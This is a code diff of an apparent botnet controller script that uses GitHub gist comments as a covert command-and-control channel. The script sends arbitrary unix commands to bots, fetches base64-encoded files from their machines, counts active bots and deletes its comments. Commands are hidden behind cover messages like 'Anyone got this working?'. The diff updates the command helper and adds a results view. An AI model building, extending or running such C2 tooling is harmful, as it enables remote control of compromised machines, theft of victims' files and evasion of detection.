@@ -5,7 +5,7 @@ import threading
 import time
 import requests
 from dotenv import dotenv_values
-from utils import create_markdown_comment,  create_markdown_timestamp, get_random_message, parse_markdown_comment
+from utils import create_command,   create_markdown_timestamp, get_random_message, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='python controller.py',
@@ -13,10 +13,11 @@ parser = argparse.ArgumentParser(
     usage="""
     "post": create comment with text and bot command - this wil create a comment and use it for all subsequent commands
     "command": submit a bot command - this wil use last command comment or create a new one with random message 
-    "commands": show commands and responses
         <any unix command>: send unix command to be called by bots 
         "clear": command bots to delete their comments
-        "get": get a file from bots machine
+        "get": get a base64-encoded file from bots machine 
+    "commands": show commands and responses
+    "results": show bot responses
     "bots": show active bot count
     "clear": delete controller comments
     "comments": show gist comments
@@ -68,13 +69,12 @@ def get_comments(latest_only=False):
     return comments
 
 
-def print_comments(latest_only=False, commands_only=False):
-    comments = get_comments(latest_only=latest_only)
+def print_comments(comments, commands_only=False, results_only=False):
 
     comment_cards = map(lambda comment: f"""
     {comment['updated_at']}: {comment['user']['login']}[{comment['user']['id']}]> "{parse_markdown_comment(comment['body']) if commands_only else comment['body']}" """, comments)
 
-    for card in comment_cards:
+    for card in filter(lambda card: results_only == False or '<<' in card, comment_cards):
         print(card)
 
 
@@ -85,10 +85,11 @@ def post_comment(message):
     return response
 
 
-def post_command(command):
+def post_command(input):
+
     def get_message():
         state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
-        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
+        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_command(input)}"
     command_comment = state['command_comment']
 
     if command_comment is None:
@@ -101,7 +102,7 @@ def post_command(command):
 
     if (response.status_code == 404):
         state['command_comment'] = None
-        return post_command(command)
+        return post_command(input)
 
     update_comment(
         comment_id=command_comment['id'], message=get_message())
@@ -133,7 +134,7 @@ def ping_bots():
         state['ping_text'] = state['ping_text'] if state['ping_text'] is not None else get_random_message(
             ['Anyone got this working?', 'Is this up to date?'])
 
-        return f"{state['ping_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment('ping')}"
+        return f"{state['ping_text']}\n\n{create_markdown_timestamp()}\n\n{create_command('ping')}"
 
     while True:
         try:
@@ -177,20 +178,26 @@ while True:
     match command:
         case 'comments':
             print('> fetching comments')
-            print_comments()
+            print_comments(get_comments())
+
         case 'commands':
             print('> fetching commands')
-            print_comments(commands_only=True)
+            print_comments(get_comments(), commands_only=True)
+
+        case 'results':
+            print('> fetching results')
+            print_comments(get_comments(), results_only=True,
+                           commands_only=True)
 
         case 'latest':
             print('> fetching latest commands')
-            print_comments(latest_only=True, commands_only=True)
+            print_comments(get_comments(latest_only=True), commands_only=True)
 
         case 'post':
             text = prompt("> Write comment: ", default=get_random_message())
             command = prompt("> Submit command: ")
             response = post_comment(
-                f'{text}\n\n{create_markdown_comment(command)}')
+                f'{text}\n\n{create_command(command)}')
             state['command_comment'] = response.json()
             state['command_text'] = text
             print(response)
